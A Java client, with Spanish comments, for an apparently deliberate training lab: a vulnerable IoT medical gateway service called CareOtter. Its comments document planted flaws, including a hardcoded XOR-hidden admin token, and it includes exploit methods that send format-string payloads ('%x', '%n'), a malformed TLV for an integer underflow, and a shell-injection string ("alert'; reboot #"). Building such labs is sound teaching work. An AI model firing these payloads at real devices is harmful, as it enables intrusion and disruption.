import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
 
/**
 * CareOtterClient - Cliente Java para el servicio de administración CareOtter
 * Protocolo IGP (IoT Gateway Protocol) v4
 * 
 * Este cliente conecta al servicio careservice en puerto 9999 y expone
 * las vulnerabilidades intencionales para análisis:
 * 
 * VULNERABILIDADES DEL SERVICIO:
 * - Format String (cmd 0x05): El servidor usa el payload directamente como 
 *   formato en snprintf() - permite leak de stack o crash con %n
 * - Integer Underflow (cmd 0x04): El parser TLV tiene underflow en remaining
 * - Hardcoded Token (cmd 0x02): Token "OtterMobile2026" ofuscado con XOR
 * - Information Disclosure (cmd 0x03): Lee /etc/config/wireless
 * 
 * PROTOCOLO IGP v4:
 * Header: [Magic(4) | Cmd(1) | Status(1) | Len(2)] = 8 bytes
 * Magic: 0x474F4154 ("GOAT" en ASCII)
 * Endianness: Big Endian (network byte order)
 * 
 * COMANDOS:
 * 0x01 - SYS_INFO:         Información pública del sistema (kernel, arquitectura)
 * 0x02 - AUTHENTICATE:    Login con token admin (XOR obfuscado en este cliente)
 * 0x03 - GET_NETWORK:     Lee configuración WiFi (requiere auth) — information disclosure
 * 0x04 - SET_PREFS:       Parser TLV vulnerable a underflow (requiere auth)
 * 0x05 - VERIFY_STATUS:   Vulnerable a format string (payload = format)
 * 0x06 - SET_WIFI:        Configura WiFi vía UCI (requiere auth)
 * 0x07 - GET_VITALS:      Proxy a sensor :8081
 * 0x08 - SET_THRESHOLD:   Umbrales clínicos TLV (requiere auth)
 * 0x09 - REBOOT_SERVICE:  Reinicia servicio init.d (requiere auth)
 * 0x0A - GET_LOG:         Últimos 512 bytes del log (requiere auth)
 * 0x0B - DEFIBRILLATE:    Activa desfibrilador simulado (requiere auth) — format string en log
 * 0x0C - EMERGENCY_ALERT: Envía alerta vía curl (requiere auth) — command injection
 */
public class CareOtterClient {
    // Protocol Constants
    private static final int MAGIC = 0x474F4154; // "GOAT" - Magic number del protocolo
    private static final int PORT = 9999;
    
    // VULNERABILITY: Token obfuscado con XOR - Los estudiantes deben
    // reverse-engineer esta lógica para encontrar el token real
    // Token real: "OtterMobile2026"
    // XOR key: 0x5A
    private static final byte[] ENCODED_TOKEN = {
        0x15, 0x2E, 0x2E, 0x3F, 0x28, 0x17, 0x35, 0x38, 
        0x33, 0x36, 0x3F, 0x68, 0x6A, 0x68, 0x6C
    };
    private static final byte XOR_KEY = 0x5A;
 
    private String serverIp;
    private int serverPort;
    private boolean isAuthenticated = false;
 
    /**
     * Constructor del cliente CareOtter
     * @param ip Dirección IP del dispositivo (ej: "192.168.2.1")
     * @param port Puerto del servicio (normalmente 9999)
     */
    public CareOtterClient(String ip, int port) {
        this.serverIp = ip;
        this.serverPort = port;
    }
    
    /**
     * Decodifica el token admin usando XOR.
     * Los estudiantes pueden encontrar el token analizando este método
     * o extrayendo ENCODED_TOKEN y aplicando XOR 0x5A.
     * 
     * @return Token admin descifrado: "OtterMobile2026"
     */
    private String getDecodedToken() {
        byte[] decoded = new byte[ENCODED_TOKEN.length];
        for (int i = 0; i < ENCODED_TOKEN.length; i++) {
            decoded[i] = (byte) (ENCODED_TOKEN[i] ^ XOR_KEY);
        }
        return new String(decoded);
    }
    
    /**
     * Construye el header IGP v4
     * Formato: [Magic(4 bytes) | Cmd(1 byte) | Status(1 byte) | Len(2 bytes)]
     * 
     * @param cmd Comando (0x01-0x05)
     * @param payloadLen Longitud del payload en bytes
     * @return Header de 8 bytes listo para enviar
     */
    private byte[] buildHeader(byte cmd, short payloadLen) {
        ByteBuffer buffer = ByteBuffer.allocate(8);
        buffer.order(ByteOrder.BIG_ENDIAN);
        buffer.putInt(MAGIC);
        buffer.put(cmd);
        buffer.put((byte) 0x00); // Status (0 para requests)
        buffer.putShort(payloadLen);
        return buffer.array();
    }
 
    /**
     * Comando 0x01 - SYS_INFO
     * Obtiene información pública del sistema (no requiere auth)
     * 
     * Respuesta: "v:6.6.104|m:armv7l" (versión kernel y arquitectura)
     * 
     * @return Información del sistema
     * @throws IOException Error de conexión
     */
    public String getSystemInfo() throws IOException {
        return sendCommand((byte) 0x01, null);
    }
 
    /**
     * Comando 0x02 - AUTHENTICATE
     * Autentica con el servidor usando el token admin.
     * El token está obfuscado con XOR en este cliente.
     * 
     * Token hardcoded en el servidor: "OtterMobile2026"
     * 
     * @return "AUTH_SUCCESS" o "AUTH_FAIL"
     * @throws IOException Error de conexión
     */
    public String authenticate() throws IOException {
        String realToken = getDecodedToken();
        String response = sendCommand((byte) 0x02, realToken.getBytes());
        if (response.contains("AUTH_SUCCESS")) {
            this.isAuthenticated = true;
        }
        return response;
    }
 
    /**
     * Comando 0x03 - WIFI_CONFIG
     * Obtiene la configuración WiFi del dispositivo.
     * 
     * VULNERABILITY: Information Disclosure
     * - Requiere autenticación (bypass si se explota otra vuln)
     * - Lee archivo /etc/config/wireless sin sanitización
     * - Puede contener credenciales WiFi en plaintext
     * 
     * @return Contenido de /etc/config/wireless o "RESTRICTED"
     * @throws IOException Error de conexión
     */
    public String getWifiConfig() throws IOException {
        return sendCommand((byte) 0x03, null);
    }
 
    /**
     * Comando 0x04 - SET_PREFS
     * Parser TLV (Type-Length-Value) para preferencias de la app.
     * 
     * VULNERABILITY: Integer Underflow
     * El servidor hace: remaining -= 2; remaining -= t_len;
     * Si enviamos datos malformados, remaining puede hacer underflow
     * y pasar la validación t_len <= remaining, causando buffer overflow
     * en local_store[128].
     * 
     * Formato TLV: [Type(1) | Length(1) | Value(n)]
     * Type 0xAA = Tema de la aplicación (theme)
     * 
     * @param themeName Nombre del tema/colores de la app
     * @return Respuesta del servidor
     * @throws IOException Error de conexión
     */
    public String setAppTheme(String themeName) throws IOException {
        byte[] themeBytes = themeName.getBytes();
        // Construir TLV: [0xAA] [len] [value...]
        ByteBuffer tlv = ByteBuffer.allocate(2 + themeBytes.length);
        tlv.put((byte) 0xAA);  // Type: Theme
        tlv.put((byte) themeBytes.length);  // Length
        tlv.put(themeBytes);  // Value
        return sendCommand((byte) 0x04, tlv.array());
    }
    
    /**
     * Comando 0x04 con payload malicioso para exploit de underflow
     * 
     * Payload diseñado para causar integer underflow en:
     * remaining -= 2;
     * remaining -= t_len;
     * 
     * Si remaining = 0 y enviamos t_len = 0xFF, después del -= 2:
     * remaining = 0xFFFE (underflow), y 0xFF <= 0xFFFE pasa validación,
     * permitiendo memcpy fuera de límites.
     * 
     * @return Respuesta del servidor (posible crash o comportamiento extraño)
     * @throws IOException Error de conexión
     */
    public String exploitUnderflow() throws IOException {
        // Payload malicioso: [Type=0xAA] [Len=0xFF] [pocos bytes]
        // Esto causa underflow en remaining - 2 - 0xFF
        byte[] malicious = new byte[] {
            (byte) 0xAA,  // Type
            (byte) 0xFF,  // Length = 255 (miente)
            0x41, 0x41, 0x41, 0x41  // Solo 4 bytes de value
        };
        return sendCommand((byte) 0x04, malicious);
    }
 
    /**
     * Comando 0x05 - VERIFY_STATUS
     * Obtiene estado del módulo especificado.
     * 
     * VULNERABILITY: Format String
     * El servidor usa snprintf(buf, size, module_name) donde module_name
     * viene directamente del payload sin sanitizar.
     * 
     * Payloads de prueba:
     * - "Main" → Respuesta normal
     * - "%x%x%x%x" → Leak de stack (direcciones de memoria)
     * - "%n" → Escritura en memoria (puede causar crash SIGSEGV)
     * 
     * @param moduleName Nombre del módulo (o format string)
     * @return Estado del módulo (o datos leak si es format string)
     * @throws IOException Error de conexión
     */
    public String verifyStatus(String moduleName) throws IOException {
        return sendCommand((byte) 0x05, moduleName.getBytes());
    }
    
    /**
     * Comando 0x0B - DEFIBRILLATE_CMD (requiere auth)
     * Simula la descarga de un desfibrilador. El servidor escribe el evento en
     * /tmp/careotter_events.log usando el payload como formato snprintf — segundo
     * sink de format string.
     *
     * @return "DEFIB_TRIGGERED:200J:<timestamp>" o "RESTRICTED"
     * @throws IOException Error de conexión
     */
    public String triggerDefibrillator() throws IOException {
        return sendCommand((byte) 0x0B, "DISCHARGE".getBytes());
    }

    /**
     * Comando 0x0C - EMERGENCY_ALERT (requiere auth)
     * Envía alerta de emergencia vía curl al endpoint en /etc/careotter/alert.conf.
     *
     * VULNERABILITY: el payload se interpola directamente en system() del servidor.
     * alertMessage como "patient down'; reboot #" inyecta un comando de shell.
     *
     * @param alertMessage Mensaje de alerta (o payload de inyección)
     * @return "ALERT_SENT:<alertMessage>" o "RESTRICTED"
     * @throws IOException Error de conexión
     */
    public String sendEmergencyAlert(String alertMessage) throws IOException {
        return sendCommand((byte) 0x0C, alertMessage.getBytes());
    }

    /**
     * Exploit de command injection en EMERGENCY_ALERT (0x0C).
     * Añade "; reboot #" al payload para demostrar inyección OS.
     * El servidor ejecuta: system("curl ... -d 'msg=<payload>'")
     * El apóstrofe cierra el argumento de -d y "; reboot" se ejecuta como comando separado.
     *
     * @return Respuesta del servidor antes del reboot (si llega)
     * @throws IOException Error de conexión
     */
    public String exploitCommandInjection() throws IOException {
        String injectedPayload = "alert'; reboot #";
        return sendCommand((byte) 0x0C, injectedPayload.getBytes());
    }

    /**
     * Envía un comando genérico al servidor IGP
     *
     * @param cmd Código de comando
     * @param payload Datos del comando (puede ser null)
     * @return Respuesta del servidor como String
     * @throws IOException Error de conexión
     */
    private String sendCommand(byte cmd, byte[] payload) throws IOException {
        short payloadLen = (payload != null) ? (short) payload.length : 0;
        byte[] header = buildHeader(cmd, payloadLen);
 
        try (Socket socket = new Socket(serverIp, serverPort);
             DataOutputStream out = new DataOutputStream(socket.getOutputStream());
             DataInputStream in = new DataInputStream(socket.getInputStream())) {
 
            // Enviar Header
            out.write(header);
            // Enviar Payload si existe
            if (payload != null) out.write(payload);
            out.flush();
 
            // Leer Respuesta (máximo 1024 bytes)
            byte[] response = new byte[1024];
            int bytesRead = in.read(response);
            return (bytesRead > 0) ? new String(response, 0, bytesRead) : "EMPTY_RESP";
        }
    }
    
    /**
     * Verifica si el cliente está autenticado
     * @return true si authenticate() tuvo éxito
     */
    public boolean isAuthenticated() {
        return isAuthenticated;
    }
    
    /**
     * Ejemplo de uso del cliente
     */
    public static void main(String[] args) {
        try {
            CareOtterClient client = new CareOtterClient("192.168.2.1", 9999);
            
            // 1. Info pública
            System.out.println("System Info: " + client.getSystemInfo());
            
            // 2. Autenticar
            System.out.println("Auth: " + client.authenticate());
            
            if (client.isAuthenticated()) {
                // 3. WiFi config (Information Disclosure)
                System.out.println("WiFi: " + client.getWifiConfig());
                
                // 4. Theme (Integer Underflow trigger)
                System.out.println("Theme: " + client.setAppTheme("DarkMode"));
                
                // 5. Status normal
                System.out.println("Status: " + client.verifyStatus("Main"));
                
                // 6. Format String attack
                System.out.println("Leak: " + client.verifyStatus("%x%x%x%x"));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
